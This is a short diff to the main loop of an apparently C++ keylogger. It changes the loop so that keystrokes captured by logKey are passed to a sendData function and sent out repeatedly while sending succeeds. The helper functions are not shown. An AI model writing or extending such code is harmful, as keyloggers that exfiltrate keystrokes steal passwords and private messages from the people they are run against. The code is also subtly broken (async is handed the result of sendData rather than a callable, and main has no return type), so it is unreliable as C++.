@@ -3,8 +3,13 @@
 using namespace std;
 
 main() {
-    while ( 1 ) {
-        future<char *> keys = async(logKey);
-        char * file_name = keys.get();
+    future<char *> keys;
+    future<bool> dataSent;
+    bool firstLoop = true;
+    while ( firstLoop || dataSent.get() ) {
+        keys = async(logKey);
+        dataSent = async(sendData(keys.get()));
+        firstLoop = false;
     }
+    return 0;
 }
